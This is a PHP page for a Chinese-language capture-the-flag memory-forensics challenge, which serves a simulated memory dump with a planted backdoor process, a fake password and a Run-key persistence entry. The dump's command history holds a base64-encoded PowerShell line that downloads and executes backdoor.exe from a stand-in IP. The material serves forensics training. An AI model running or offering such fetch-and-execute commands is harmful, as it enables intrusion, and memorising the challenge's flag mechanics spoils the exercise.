<?php
require_once('../flag_helper.php');
$challengeName = 'memory_dump';
$flagManager = getFlagManager();
$flag = $flagManager->getFlag($challengeName);
$message = "";

// 生成模拟内存转储文件
if (isset($_GET['action']) && $_GET['action'] === 'download') {
    while (ob_get_level() > 0) { ob_end_clean(); }
    
    // 模拟内存转储
    $memData = '';
    
    // 进程列表区域
    $memData .= "[PROCESSES]\n";
    $memData .= "PID:1  Name:System\n";
    $memData .= "PID:100 Name:notepad.exe\n";
    $memData .= "PID:200 Name:cmd.exe\n";
    $memData .= "PID:250 Name:chrome.exe\n";
    $memData .= "PID:300 Name:explorer.exe\n";
    $memData .= "PID:404 Name:backdoor.exe  *** 可疑进程 ***\n";
    
    // 网络连接区域
    $memData .= "\n[NETWORK]\n";
    $memData .= "TCP 192.168.1.5:445 -> 10.0.0.1:80 ESTABLISHED\n";
    $memData .= "TCP 192.168.1.5:3389 -> 203.0.113.5:4444 ESTABLISHED  *** 可疑连接 ***\n";
    
    // 内存字符串区域
    $memData .= "\n[MEMORY_STRINGS]\n";
    $memData .= "admin_password = 'P@ssw0rd_2024'\n";
    $memData .= "flag = '" . $flag . "'\n";
    $memData .= "backdoor_ip = '203.0.113.5'\n";
    $memData .= "encryption_key = 'a1b2c3d4e5f6'\n";
    
    // 注册表键值区域
    $memData .= "\n[REGISTRY]\n";
    $memData .= "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    $memData .= "    backdoor.exe = C:\\Users\\admin\\AppData\\Roaming\\backdoor.exe\n";
    $memData .= "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ProductName = Windows 10 Pro\n";
    
    // 命令历史
    $memData .= "\n[COMMAND_HISTORY]\n";
    $memData .= "cmd.exe (PID:200):\n";
    $memData .= "  > net user administrator P@ssw0rd_2024\n";
    $memData .= "  > echo flag >> C:\\Users\\admin\\Desktop\\flag.txt\n";
    $memData .= "  > powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4ANQAvAGIAYQBjAGsAZABvAG8AcgAuAGUAeABlACcAKQA=\n";
    
    // 解码PowerShell命令的提示
    $memData .= "\n[ANALYSIS]\n";
    $memData .= "PowerShell命令(base64): 下载并执行后门程序\n";
    $memData .= "建议: 使用 strings + grep 提取关键信息\n";
    
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="memory_dump.raw"');
    header('Content-Length: ' . strlen($memData));
    echo $memData;
    exit();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['answer'])) {
    $answer = trim($_POST['answer']);
    if ($answer === $flag) {
        $message = "success";
    } else {
        $message = "error";
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>内存取证 - HiveYarnZinc</title>
        <?php require_once '../progress_helper.php'; ?>
<style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0a0f; color: #00ff00; min-height: 100vh; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 40px; padding: 30px; border-bottom: 2px solid #00ffff; }
        .header h1 { font-size: 2.5em; color: #00ffff; text-shadow: 0 0 20px #00ffff; }
        .back-link { color: #00ffff; text-decoration: none; }
        .info-box { background: rgba(0,255,255,0.05); border: 1px solid #00ffff; border-radius: 10px; padding: 25px; margin-bottom: 30px; }
        .download-section { background: #000; border: 2px solid #00ffff; border-radius: 15px; padding: 40px; text-align: center; margin-bottom: 30px; }
        .download-btn { display: inline-block; padding: 20px 50px; background: linear-gradient(135deg, #00ffff, #0088ff); color: #000; text-decoration: none; border-radius: 5px; font-size: 1.3em; font-weight: bold; }
        .tools-box { background: rgba(0,0,0,0.8); border: 2px solid #00ffff; border-radius: 15px; padding: 25px; margin-bottom: 30px; }
        .tool-item { background: rgba(0,255,255,0.05); border: 1px solid #00ffff; border-radius: 10px; padding: 15px; margin-bottom: 10px; }
        .tool-item strong { color: #ff0; }
        .tool-item code { color: #0ff; display: block; margin-top: 5px; }
        .result { padding: 20px; border-radius: 10px; text-align: center; margin-bottom: 20px; }
        .result.success { background: rgba(0,255,0,0.1); border: 2px solid #00ff00; color: #00ff00; }
        .result.error { background: rgba(255,0,0,0.1); border: 2px solid #ff0000; color: #ff0000; }
        .submit-box { background: rgba(0,0,0,0.8); border: 2px dashed #00ffff; border-radius: 15px; padding: 40px; text-align: center; }
        .submit-box input { width: 100%; max-width: 400px; padding: 15px; background: #000; border: 1px solid #00ffff; color: #00ffff; font-size: 1.2em; border-radius: 5px; text-align: center; font-family: 'Courier New', monospace; }
        .submit-box button { margin-top: 20px; padding: 15px 50px; background: linear-gradient(135deg, #00ffff, #0088ff); border: none; border-radius: 5px; color: #000; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h1>🧠 内存取证</h1><a href="../index.php" class="back-link">[ ← 返回首页 ]</a></div>
        <div class="info-box"><h3>💡 题目描述</h3>
            <p>获取到一台受感染机器的内存转储文件，需要分析恶意行为。<br>
            <strong>目标:</strong> 从内存转储中找到隐藏的Flag<br>
            <span style="color:#ff0;">提示:</span> 使用 <code>strings</code> 查找 <code>flag =</code> 或 <code>backdoor</code></p>
        </div>
        
        <div class="download-section">
            <a href="?action=download" class="download-btn">[ 🧠 下载 memory_dump.raw ]</a>
        </div>
        
        <div class="tools-box">
            <h3>🛠️ 内存取证工具</h3>
            <div class="tool-item"><strong>strings</strong><code>strings memory_dump.raw | grep -i "flag\|backdoor"</code></div>
            <div class="tool-item"><strong>Volatility</strong><code>volatility -f memory_dump.raw imageinfo</code></div>
            <div class="tool-item"><strong>Bulk Extractor</strong><code>bulk_extractor memory_dump.raw -o output/</code></div>
        </div>
        
        <?php if ($message === 'success'): ?>
        <div class="result success"><h2>🎉 恭喜！</h2><p>Flag正确！</p></div>
        <?php elseif ($message === 'error'): ?>
        <div class="result error"><h2>❌ 错误</h2><p>Flag不正确！</p></div>
        <?php endif; ?>
        
        <div class="submit-box">
            <h3 style="color:#00ffff;margin-bottom:20px;">📝 提交Flag</h3>
            <form method="POST">
                <input type="text" name="answer" placeholder="HiveYarnZinc{...}">
                <button type="submit">[ 提交 ]</button>
            </form>
        </div>
    </div>
</body>
</html>
